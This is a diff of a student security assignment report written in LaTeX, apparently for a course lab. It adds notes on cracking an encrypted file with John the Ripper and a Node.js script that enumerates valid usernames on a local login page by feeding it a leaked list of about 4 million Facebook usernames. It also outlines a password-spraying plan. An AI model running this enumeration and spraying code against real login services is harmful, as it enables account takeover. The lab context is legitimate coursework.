@@ -98,7 +98,7 @@ reymysterio:minnesota.:1011:1011::/home/reymysterio:/bin/sh
 \part*{Part B}
 
 (\url{https://github.com/Davidj361/4108ass1/blob/master/part2.cc}) \\
-The script: 
+C++ program: 
 
 \begin{lstlisting}
 // C++ stuff
@@ -327,9 +327,101 @@ Unfortunately I was not able to crack the secret txt file even after running eve
 \begin{lstlisting}
 ./a.out files/secret_file.aes256.txt files/JohnTheRipper-unstable-jumbo/run/john /usr/share/dict/cracklib-small
 \end{lstlisting}
-Where it uses the cracklib-small dictionary with the rules "Single".
+Where it uses the cracklib-small dictionary with the rules "Single". \\
+
+If I was lucky with john the ripper actually finding the right password, I would say the reason why I was able to decrypt the file is because MD5 is a very simple hashing function that doesn't take long to execute so it has the same affect as manually brute forcing with plain passwords.
 
 \part*{Part C}
+
+\url{https://github.com/Davidj361/4108ass1/blob/master/part3/memorycrash.js} \\
+Node.js program:
+\begin{lstlisting}
+// Includes
+const Promise = require("bluebird");
+const bhttp = require("bhttp");
+const tough = require("tough-cookie");
+const cheerio = require('cheerio');
+const taskQueue = require("promise-task-queue");
+const fs = require("fs");
+const readline = require("readline");
+const stream = require("stream");
+
+const argv = process.argv;
+if (argv.length < 3) {
+  console.log("Need additional arguments");
+  process.exit(1);
+}
+const facebookFile = argv[2];
+var facebookStream = fs.createReadStream(facebookFile);
+var outstream = new stream;
+const validUsersFile = "/tmp/part2.validUsernames.txt";
+
+// Setup a session for storing cookies
+var cookieJar = new tough.CookieJar();
+var agentOptions = {
+  maxCachedSessions: 10 
+}
+var options = {
+  headers: {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"},
+  cookieJar: cookieJar,
+  rejectUnauthorized: false,
+}
+var httpSession = bhttp.session(options);
+var queue = taskQueue();
+var failedRequests = 0;
+
+queue.on("failed:apiRequest", function(task) {
+  failedRequests += 1;
+});
+
+queue.define("checkUsername", function(task) {
+  return Promise.try(function() {
+    var payload = {
+      username: task.user,
+      password: "root"
+    }
+    return httpSession.post("http://localhost:5000/login", payload);
+  }).then(function(response) {
+    var bodyStr = response.body.toString();
+    $ = cheerio.load(bodyStr);
+    var ret = "No match found";
+    var select = $(".alert");
+    if (select !== undefined) {
+      var str = select.text().trim();
+      if (str !== undefined && str.length != 0 && str.includes("Username does not exist") ) {
+        console.log("FOUND A USERNAME: " + task.user);
+        var line = task.user + '\n';
+        fs.appendFileSync(validUsersFile, line);
+      }
+    }
+  });
+}, {
+  concurrency: 2
+});
+
+var r1 = readline.createInterface({
+  input: facebookStream,
+  terminal: false
+});
+r1.on("line", function(line) {
+  console.log("Trying username: " + line);
+  var user = line.trim();
+  Promise.try(function() {
+    return queue.push("checkUsername", {user: user});
+  }).then(function(jsonResponse) {
+  })
+});
+\end{lstlisting}
+
+The above program obtained me a partial list of usernames of the website. Unfortunately it crashes because it tries to add 4 million facebook usernames to the taskQueue. Without taskQueue, there's too many post requests and once and overloads the SSH tunnel and the web server.\\
+
+Afterward I would use the same method from the C++ program of having john the ripper send its output to stdout via the --stdout option. Then iterate the list of a valid usernames that was made from "/tmp/part2.validUsernames.txt" and test them against the password suggested by john the ripper.\\
+
+Unfortunately I couldn't finish as I got stuck on dealing with memory crashes or overloading the webserver/ssh-tunnel. A possible solution was to link the promises made for each POST request but I was unable to figure out how to properly iterate through a 4.1 million line long text file manually instead of relying on mapping a function for each element. And taskQueue only handles with throttling how many requests are handled at once, not how many should get added.\\
+
+If I had bypassed these issues, I would've been able do something like 100 POST requests asychonously processed at once where I could test for valid usernames and passwords very quickly.\\
+
+And for testing against the passwords, I would test the same password against a set of 40, assuming that I had 1000 valid usernames in a textfile, and I would be using a common passwords wordlist.
 
 
 \end{document}
